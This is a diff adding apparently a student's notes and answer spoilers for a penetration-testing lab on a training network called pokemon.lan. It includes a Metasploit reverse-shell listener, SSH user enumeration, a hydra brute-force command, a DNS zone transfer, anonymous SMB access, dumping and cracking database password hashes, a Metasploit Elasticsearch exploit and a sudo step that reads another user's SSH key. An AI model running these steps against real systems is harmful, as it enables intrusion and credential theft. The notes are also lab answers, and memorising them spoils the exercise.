@@ -1,0 +1,66 @@
+
+
+#!/bin/bash
+msfconsole -q -x "use exploit/multi/handler;set PAYLOAD <PAYLOAD>;set LHOST <LHOST>;set LPORT <LPORT>;exploit -j"
+
+
+
+msfconsole
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS 192.168.52.60
+set USER_FILE users
+run
+
+metesploit:
+msfconsole
+search ssh_login
+use auxiliary/scanner/ssh/ssh_enumusers
+set RHOSTS <target_ip>
+set USER_FILE /path/to/usernames.txt
+run
+
+hydra:
+hydra -L <usernames_file> -P <passwords_file> <target_ip> ssh
+
+## docent meneer voortonen spoilers 1
+
+Who are the hardware vendors of the live systems on this network?
+=> nmap -sn iprange (mac addres finder)
+Who is the DNS server of the pokemon.lan environment?
+=> cat /etc/resolv.conf
+Is it vulnerable to a DNS zone transfer attack?
+=> dig axfr pokemon.lan @192.168.52.4(dnsserveripaddres see /etc/resolv.conf)
+Did you find any vulnerable fileshares on the environment?
+=> nmap -p 139,445 --open pokemon.lan.lst (smb fileshare)
+=> check login with smbclient
+=> smbclient -L \\{ip}\\ -U anonymous
+=> smbclient \\\\{ip}\\sharename -U anonymous
+=> dir
+=> get x.txt
+
+done until here
+
+Is there a Minecraft server running on the environment, and is it really Minecraft?
+=> nmap -p 25565 -il pokemon.lan.lst --open -sV
+Which database software is running in the environment and are you able to get access (Tip: default username and use a self constructed list with the first 151 pokemon)?
+=>...
+Can you dump and crack the user hashes of the database users?
+=> select username,password from pg_shadow
+=> copy paste
+=> formatten als username:hash
+=> hashcat hashlist.list --user (to detect hash automatitcaly)
+=> hashcat hashlist.list --user -m 28600 password.list
+Try to perform some LDAP NMAP scripts on the domain controller. Which LDAP versions are supported?
+=> ls /usr/share/nmap/scripts | grep ldap
+=> nmap --script=ldap* {ip}
+=> toggle verbosety
+On Alakazam there is a vulnerable software running on it's default port, which software and version? Use Metasploit and try to exploit this service.
+=> alakazam.pokemon.lan:9200 keer bekijke info pagina van elasticsearch
+=> msfconsole, seqrch elqstic, use 0, set rhosts exploit, shell
+When you gained access on Alakazam, as which user are you accessing the machine? Try to privilage escalate to another user (Tip: not root).
+=> shell, whoami:elasticsearch
+=> ls /home => ash
+=> ls /home/ash -Ral
+=> sudo l
+=> sudo cat /home/ash/.ssh/id_rsa.pub
+
